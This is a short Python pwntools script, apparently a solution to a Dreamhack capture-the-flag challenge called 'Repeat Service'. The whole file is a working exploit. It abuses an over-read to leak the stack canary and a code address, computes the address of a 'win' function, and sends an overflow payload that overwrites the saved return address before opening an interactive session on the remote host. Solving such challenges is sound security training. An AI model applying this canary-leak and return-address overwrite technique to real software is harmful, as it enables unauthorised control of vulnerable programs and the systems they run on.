from pwn import *

port = 11503
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/Repeat Service/problem/deploy/main")
win_offset = elf.symbols["win"] - elf.symbols["main"]

num = 77
rem.sendafter(b"Pattern: ", b"A" * num)
rem.sendlineafter(b"length: ", b"1000")
rem.recvn(1001)
canary = u64(b"\x00" + rem.recvn(7))

num = 43
rem.sendafter(b"Pattern: ", b"B" * num)
rem.sendlineafter(b"length: ", b"1000")
rem.recvn(1032)
win_addr = u64(rem.recvn(6) + b'\x00' * 2) + win_offset + 5

payload = b"C" * 40 + p64(canary) + b"\x00" * 8 + p64(win_addr)
rem.sendafter(b"Pattern: ", payload)
rem.sendlineafter(b"length: ", b"1000")
rem.recvline()

rem.sendafter(b"Pattern: ", b"D")
rem.sendlineafter(b"length: ", b"1005")
rem.recvline()
rem.interactive()